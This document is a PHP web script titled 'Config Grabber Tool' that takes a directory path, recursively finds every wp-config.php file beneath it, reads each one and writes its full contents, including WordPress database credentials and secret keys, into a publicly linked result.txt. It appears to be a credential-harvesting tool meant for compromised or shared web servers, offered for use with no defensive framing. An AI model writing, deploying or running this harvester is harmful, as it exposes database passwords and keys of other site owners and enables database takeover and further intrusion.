<?php
// Handle form submission
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $dir = $_POST['dir'];
    $outputFile = 'result.txt';

    // Input validation
    if (!is_dir($dir)) {
        echo "<p class='error'>Invalid or non-existent directory.</p>";
        exit;
    }

    // Function to find wp-config.php files
    function findWpConfigFiles(string $directory): array {
        $configFiles = [];
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));

        foreach ($iterator as $fileInfo) {
            if ($fileInfo->isFile() && $fileInfo->getFilename() === 'wp-config.php') {
                $configFiles[] = $fileInfo->getPathname();
            }
        }
        return $configFiles;
    }

    // Find config files
    $foundFiles = findWpConfigFiles($dir);

    // Display and save results
    if (count($foundFiles) > 0) {
        echo "<div class='success'>";
        echo "<h3>Config Files Found:</h3>";
        echo "<ul>";
        foreach ($foundFiles as $file) {
            $content = file_get_contents($file);
            $result = "Path: $file\nContent:\n$content\n\n";
            file_put_contents($outputFile, $result, FILE_APPEND);
            echo "<li><b>Path:</b> <a href='#' data-path='" . htmlspecialchars($file) . "' class='file-link'>" . htmlspecialchars($file) . "</a></li>";
            
        }
        echo "</ul>";
        echo "<p>Results saved in <a href='$outputFile' target='_blank'>$outputFile</a></p>";
        echo "</div>";
    } else {
        echo "<p class='error'>No config files found in the specified directory.</p>";
    }
} else {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Config Grabber Tool</title>
        <style>
            body {
                font-family: sans-serif;
            }
            .container {
                max-width: 600px;
                margin: 0 auto;
                padding: 20px;
            }
            .success {
                border: 1px solid #008000;
                background-color: #f0fff0;
                padding: 10px;
            }
            .error {
                border: 1px solid #ff0000;
                background-color: #fff0f0;
                padding: 10px;
                color: #ff0000;
            }
            pre {
                background-color: #f0f0f0;
                padding: 10px;
                border-radius: 5px;
                overflow-x: auto;
            }
            .file-link {
                cursor: pointer;
            }
            .modal {
                display: none;
                position: fixed;
                z-index: 1;
                left: 0;
                top: 0;
                width: 100%;
                height: 100%;
                overflow: auto;
                background-color: rgba(0,0,0,0.4);
            }
            .modal-content {
                background-color: #fefefe;
                margin: 15% auto;
                padding: 20px;
                border: 1px solid #888;
                width: 80%;
            }
            .close {
              color: #aaa;
              float: right;
              font-size: 28px;
              font-weight: bold;
            }
            .close:hover,
            .close:focus {
              color: black;
              text-decoration: none;
              cursor: pointer;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Config Grabber Tool</h2>
            <form method="POST">
                <label for="dir">Directory Path:</label>
                <input type="text" name="dir" id="dir" required>
                <button type="submit">Grab Configs</button>
            </form>
        </div>
        <div id="myModal" class="modal">
          <div class="modal-content">
            <span class="close">&times;</span>
            <p id="modal-content"></p>
          </div>
        </div>
        <script>
            const fileLinks = document.querySelectorAll('.file-link');
            const modal = document.getElementById("myModal");
            const modalContent = document.getElementById("modal-content");
            const closeBtn = document.getElementsByClassName("close")[0];

            fileLinks.forEach(link => {
                link.addEventListener('click', (e) => {
                    e.preventDefault();
                    fetch(link.dataset.path)
                        .then(response => response.text())
                        .then(content => {
                            modalContent.textContent = content;
                            modal.style.display = "block";
                        });
                });
            });

            closeBtn.onclick = function() {
              modal.style.display = "none";
            }
            window.onclick = function(event) {
              if (event.target == modal) {
                modal.style.display = "none";
              }
            }
        </script>
    </body>
    </html>
    <?php
}
?>
